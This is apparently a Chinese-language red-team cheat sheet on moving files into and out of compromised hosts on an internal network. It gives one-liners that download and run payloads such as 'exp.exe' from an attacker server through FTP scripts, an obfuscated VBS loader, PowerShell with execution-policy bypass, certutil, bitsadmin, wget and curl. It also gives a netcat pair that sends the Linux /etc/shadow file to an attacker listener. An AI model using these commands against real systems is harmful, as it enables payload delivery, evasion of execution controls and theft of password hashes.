# 内网文件传输

#### Windows目标 <a id="windows-"></a>

**FTP**

```text
1、echo open 192.168.0.23 2121 >> 1.txt         //登陆FTP服务器
2、echo 123>>1.txt                              //用户名
3、echo 123>>1.txt                              //密码
4、echo bin>>1.txt                              //开始
5、echo get exp.exe>>1.txt                      //下载程序
6、echo bye>>1.txt                              //关闭FTP服务器
```

输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：

```text
ftp -s:1.txt                        //以1.txt中的内容执行ftp命令
```

**VBS**

```text
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open ^"get^",wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> loader.vbs
cscript loader.vbs http://192.168.111.1:8080/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exe
putty.exe
```

![](https://p408.ssl.qhimgs4.com/t017cf11b3dfcb24f8f.png)

**Powershell**

```text
 powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.111.1:8080/test/putty.exe','C:\Users\linghuchong\Desktop\Tools\putty1.exe')
 putty1.exe
```

![](https://p408.ssl.qhimgs4.com/t01220590f6f666844e.png)

**certutil**

```text
certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe
certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete        //删除缓存
putty.exe
```

**bitsadmin**

```text
bitsadmin /transfer 123 http://192.168.111.1:8080/test/putty.exe C:\Users\School-DU1\Desktop\dbeaver\123.exe
```

#### Linux目标 <a id="linux-"></a>

**nc**

攻击端监听端口，并重定向：

```text
nc -nvv -lp 4455 > shaodw.txt
```

目标机将文件内容回传：

```text
nc 192.168.111.251 4455 < /etc/shadow
```

![](https://p408.ssl.qhimgs4.com/t01d7f152e4fe3c328e.png)

**wget**

wget [http://192.168.111.1:8080/test/putty.exe](http://192.168.111.1:8080/test/putty.exe)

**curl**

```text
curl -O http://192.168.111.1:8080/test/putty.exe
```

#### 环境搭建 <a id="-"></a>

**使用python搭建http服务器**

Python启动simplehttpserer

![](https://p408.ssl.qhimgs4.com/t01368b22a57c8e4e1f.png)

**使用python搭建ftp服务器**

利用pyftpdlib搭建ftp服务器

![](https://p408.ssl.qhimgs4.com/t0160319195f1eea375.png)

